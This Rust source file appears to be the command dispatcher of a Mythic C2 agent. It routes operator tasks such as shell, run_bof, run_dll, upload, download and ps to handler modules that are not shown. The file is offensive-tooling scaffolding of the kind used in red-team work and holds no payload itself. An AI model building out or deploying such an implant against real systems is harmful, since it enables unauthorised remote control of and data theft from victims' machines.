#[path = "tasks/download.rs"]
mod download;
#[path = "tasks/exit.rs"]
mod cmd_exit;
#[path = "tasks/ls.rs"]
mod ls;
#[path = "tasks/ps.rs"]
mod ps;
#[path = "tasks/run_bof.rs"]
mod run_bof;
#[path = "tasks/run_dll.rs"]
pub mod run_dll;
#[path = "tasks/shell.rs"]
mod cmd_shell;
#[path = "tasks/sleep.rs"]
mod cmd_sleep;
#[path = "tasks/upload.rs"]
mod upload;

use mythic::{TaskMessage, TaskResponse};

/// Route any command to its handler.
pub fn dispatch(task: &TaskMessage) -> TaskResponse {
    match task.command.as_str() {
        "download" => download::handle(task),
        "exit" => cmd_exit::handle(task),
        "ls" => ls::handle(task),
        "ps" => ps::handle(task),
        "run_bof" => run_bof::handle(task),
        "run_dll" => run_dll::handle(task),
        "shell" => cmd_shell::handle(task),
        "sleep" => cmd_sleep::handle(task),
        "upload" => upload::handle(task),
        unknown => TaskResponse::failed(task.id, &format!("unknown command: {unknown}")),
    }
}
